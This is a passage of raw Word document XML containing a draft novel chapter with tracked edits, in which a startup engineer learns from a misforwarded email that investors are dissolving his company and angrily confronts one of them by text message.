        <w:r w:rsidR="00AE2E1F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>in the ISM-band domain. The con</w:t>
        </w:r>
        <w:r w:rsidR="00F96840">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>undrum, however, involved understanding social cues—the human factor, so</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="172" w:author="TextVet" w:date="2016-03-15T11:54:00Z">
        <w:r w:rsidR="00F96840">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>m</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="173" w:author="TextVet" w:date="2016-03-15T11:52:00Z">
        <w:r w:rsidR="00F96840">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ething far more complicated.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="174" w:author="TextVet" w:date="2016-03-15T11:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F96840">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>A conundrum pestered him from the back of his mind, distracting him from NIN Man’s request. The email thread, after all, was about dynamic self-calibrating quadrature amplitude modulation protocols in the ISM-band domain. The conundrum, on the other hand, involved understanding social cues. The latter was a much more complicated matter than the former.</w:delText>
        </w:r>
      </w:del>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deleted his reply-in-progress and replaced it with:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>To: Jason Tuttle &lt;jason.tuttle@aol.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: FW: RE: Claymore Communications intellectual property auction</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Wait, can you explain something to me please? You emailed my presentation to an engineer in Verizon's Mergers and Acquisitions department? I don't get it. You guys freaked out when I tried to post the presentation on the Claymore website because you didn't want it publicly available. But now you're forwarding it to technical experts at potential competitors? What am I missing?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reply came quickly.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Jason Tuttle &lt;jason.tuttle@aol.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>It's not your concern. Please answer Dorothy's question.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Danny cringed at being </w:t>
      </w:r>
      <w:del w:id="175" w:author="Mikhail Voloshin" w:date="2016-03-09T22:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007F5F29">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">so </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>unceremoniously relegated to the role of worker-gnome. He went back to Jason’s original email, hoping for clues. Bundled with the forward was a long heavily-indented list of prior emails. Danny began scrolling.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Jason Tuttle &lt;jason.tuttle@aol.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>To: Dorothy Eigen &lt;eigend@corp.verizon.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>(1 Attachment)</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Dorothy,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Per your request, please find the attached presentation of Claymore's technologies. Included are schematics, flowcharts, and results of field trials. This should be sufficient for proving that our asking price is justified.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>To: Jason Tuttle &lt;jason.tuttle@aol.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>From: Dorothy Eigen &lt;eigend@corp.verizon.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Jason,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>I got a green light from my director. Verizon will join the auction for the intellectual property after Claymore's dissolution. However, we'll need detailed technical data about Claymore's inventions so we know what we are bidding on. Given our mutual nondisclosure agreement, can you provide this material?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stared at that email. </w:t>
      </w:r>
      <w:ins w:id="176" w:author="TextVet" w:date="2016-03-15T11:59:00Z">
        <w:r w:rsidR="008F308A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>M</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="177" w:author="TextVet" w:date="2016-03-15T11:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008F308A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There were m</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ore </w:t>
      </w:r>
      <w:ins w:id="178" w:author="TextVet" w:date="2016-03-15T11:59:00Z">
        <w:r w:rsidR="008F308A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">pooled </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">below it, with other Verizon personnel and Claymore investors. But Danny’s eyes kept </w:t>
      </w:r>
      <w:ins w:id="179" w:author="TextVet" w:date="2016-03-15T11:59:00Z">
        <w:r w:rsidR="00B31DB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>re</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reading that message</w:t>
      </w:r>
      <w:del w:id="180" w:author="TextVet" w:date="2016-03-15T11:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B31DB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> over and over again</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, bouncing off the bottom of the screen back to the top like a program caught in an infinite loop.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Eventually, he fought through his bewilderment to write one simple question.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>To: Jason Tuttle &lt;jason.tuttle@aol.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: FW: RE: Claymore Communications intellectual property auction</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>&gt; after Claymore's dissolution</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Um. What?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Jason Tuttle’s answer appeared several minutes later. It came not as an email, but as a text message to Danny’s personal cellphone number.</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C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Danny. This is Jason.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You weren't supposed to see that.</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br/>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responded.</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873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Yeah well. I did.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I meant to just send you Verizon's last email.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I didn't intend to forward the entire thread.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I kind of got that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>All of those communications are highly confidential. There could be serious legal and financial consequences from the divulgence of that material.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Consequences for me? Or for you?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Just delete the thread and pretend you didn't see it, alright?</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br/>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For a second Danny thought about composing an explanation about why Gödel’s Incompleteness Theorem makes it technically impossible for any information-processing system, including a human mind, to operate under the premise of not having a piece of information that it does in fact have. But there was a </w:t>
      </w:r>
      <w:del w:id="181" w:author="Mikhail Voloshin" w:date="2016-03-09T22:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007F5F29">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">much </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bigger issue to address.</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873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>So, um...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>"Auction?" "Dissolution?"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>What does all of this mean?</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br/>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Even as he typed the question, he realized he was simply fighting his own denial. He knew exactly what it meant.</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C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>The investment board made a decision recently.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Claymore has never turned a profit.</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br/>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swallowed hard.</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873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I know.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>We've been focused on research and development.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>And that research is valuable. But you haven't managed to productize it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>We need more time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You've had six years.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You've been living off of our generosity.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Who do you think provides the funds that your salary comes from? Benevolent gods from the ancient empire of Moneypotamia?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>We're investors, Danny. We need a RETURN on our investment. We can't wait indefinitely for some ship that never comes in. We have other projects with better potential ROI. It had to happen eventually.</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br/>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found himself wrestling with his phone’s autocorrect as his fingers trembled.</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873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>How long?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>One week.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>We've already pulled the plug. The operations account is frozen.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Your next paycheck will be your last.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>That's it then.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I'm afraid so.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>And what about all the work I've done in the past six years?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Claymore has been MY LIFE, Jersey.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Jason. Sorry. Autocorrect.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I thought that this company would finally be the one that I could ride to the top. I poured everything I had into this. Doesn't any of it count for SOMETHING?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>My chip designs?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>My patents?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>My open-source driver patches?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Sunken costs.</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br/>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stared at Jason’s answer. Fury and self-pity knotted together in his gut. The screen grew watery before his eyes.</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873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You used me.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You FUCKING USED ME.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Danny, this really isn't personal.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I know this must hurt. I really do. But it's just business.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You had me put that presentation together just so you could lay everything I've ever done for you on the chopping block. Without that presentation, you wouldn't have been able to set up an auction for Claymore's inventions. MY inventions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You tricked me into being my own executioner.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You made me render myself obsolete and useless.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You and the rest of the investors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>And Brent?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Does Brent know? Does everybody know?</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br/>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Jason’s reply was slow to come.</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C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>No. Nobody's allowed to know outside the investment group. Certainly not the employees.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Your knowing is highly problematic.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Oh gosh. Too bad.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">So, if I </w:t>
      </w:r>
      <w:commentRangeStart w:id="182"/>
      <w:r w:rsidRPr="000D3488">
        <w:t>was</w:t>
      </w:r>
      <w:commentRangeEnd w:id="182"/>
      <w:r w:rsidR="003E10CF">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:commentReference w:id="182"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve"> to update Claymore's website right this minute with this news...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Jesus Christ Danny please don't do that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>LOL what, you wouldn't like that? How about I just post it on Facebook, then?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>That's not funny.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I could get in unbelievable trouble for letting this information slip.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>The other investors could sue me for the full value of the sale.</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br/>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let out a cold, bitter laugh.</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873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
